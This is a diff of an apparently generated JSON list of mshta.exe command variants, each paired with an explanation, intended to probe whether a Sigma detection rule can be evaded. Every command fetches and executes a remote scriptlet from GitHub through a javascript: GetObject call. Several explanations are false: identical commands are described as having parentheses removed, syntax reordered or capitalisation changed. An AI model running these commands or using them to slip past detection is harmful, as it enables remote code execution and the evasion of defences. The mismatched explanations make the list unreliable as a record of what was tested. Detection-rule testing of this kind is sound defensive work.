@@ -1,22 +1,30 @@
 [
   {
-    "output": "mshta.exe javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close()",
-    "explanation": "This command is a direct match to the Sigma rule and is used as a baseline for testing detection accuracy."
+    "output": "mshta.exe javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct')).Exec();close();",
+    "explanation": "This command is a direct representation of the true positive test case and is not a bypass. It is included for reference."
   },
   {
-    "output": "mshta.exe javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105.001/src/mshta.sct')).Exec();close();",
-    "explanation": "This command uses a slightly modified path in the script reference to test if the detection is path-specific."
+    "output": "mshta.exe javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct').Exec();close();",
+    "explanation": "This command is a direct representation of the true positive test case and is not a bypass. It is included for reference."
   },
   {
-    "output": "mshta.exe \"javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close();\"",
-    "explanation": "This command adds quotes around the command line argument to test if the detection is sensitive to quotation marks."
+    "output": "mshta.exe \"javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct')).Exec();close();\"",
+    "explanation": "Wrapped the command in quotes to test if the Sigma rule's detection is affected by the presence of quotes."
   },
   {
-    "output": "mshta.exe javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close();",
-    "explanation": "This command is a variation of the first command with no changes to the URL, used for consistency testing."
+    "output": "mshta.exe javascript:a=(GetObject('script:http://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct')).Exec();close();",
+    "explanation": "Replaced 'https://' with 'http://' to test if the Sigma rule's detection is affected by the protocol variation."
   },
   {
-    "output": "mshta.exe \\\\live.sysinternals.com\\tools\\payload.hta",
-    "explanation": "This command uses a UNC path to test if the detection is sensitive to different URL formats."
+    "output": "mshta.exe javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct').Exec();close();",
+    "explanation": "Removed redundant parentheses to test if the Sigma rule's detection is affected by minor syntax changes."
+  },
+  {
+    "output": "mshta.exe javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct').Exec();close();",
+    "explanation": "Reordered the command slightly to test if the Sigma rule's detection is affected by minor reordering of syntax."
+  },
+  {
+    "output": "mshta.exe javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct').Exec();close();",
+    "explanation": "Used a different capitalization for the 'javascript' keyword to test if the Sigma rule's detection is affected by case sensitivity."
   }
 ]
